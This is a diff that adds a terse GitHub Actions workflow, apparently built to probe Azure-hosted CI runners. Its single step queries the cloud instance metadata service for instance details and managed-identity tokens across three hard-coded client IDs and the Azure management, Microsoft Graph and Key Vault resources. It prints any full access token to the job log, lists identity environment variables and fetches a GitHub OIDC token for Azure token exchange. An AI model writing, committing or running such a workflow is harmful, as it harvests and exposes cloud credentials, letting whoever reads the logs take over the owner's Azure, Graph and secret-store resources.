@@ -1,0 +1,33 @@
+name: azmsi
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  m:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: imds
+        run: |
+          set +e
+          M=http://169.254.169.254/metadata
+          echo "=== INSTANCE_FULL ==="
+          curl -s -m 8 -H Metadata:true "$M/instance?api-version=2021-11-15" | head -c 6000; echo
+          echo "=== IDENTITIES ==="
+          curl -s -m 8 -H Metadata:true "$M/identity/info?api-version=2018-02-01" | head -c 3000; echo
+          for CID in "" 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 d6529b06-857c-4e9e-81d0-eee83f0320ab 31f3b47b-3d31-4a5b-8f7e-1f3c8c0e7b35; do
+            Q=""; [ -n "$CID" ] && Q="&client_id=$CID"
+            for RES in https://management.azure.com/ https://graph.microsoft.com/ https://vault.azure.net; do
+              T=$(curl -s -m 8 -H Metadata:true "$M/identity/oauth2/token?api-version=2018-02-01&resource=$RES$Q")
+              echo "TOK[$CID|$RES]=$(echo "$T" | head -c 260)"
+              echo "$T" | grep -q access_token && { echo "===FULLTOKEN==="; echo "$T"; }
+            done
+          done
+          echo "=== ENV ==="
+          env | grep -iE 'IDENTITY_ENDPOINT|IDENTITY_HEADER|MSI_|AZURE_|ARM_' | sed 's/=.*/=<set>/'
+          echo "=== OIDC ==="
+          echo "OIDC_URL=${ACTIONS_ID_TOKEN_REQUEST_URL:0:60}"
+          O=$(curl -s -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
+          echo "OIDC_RESP=${O:0:200}"
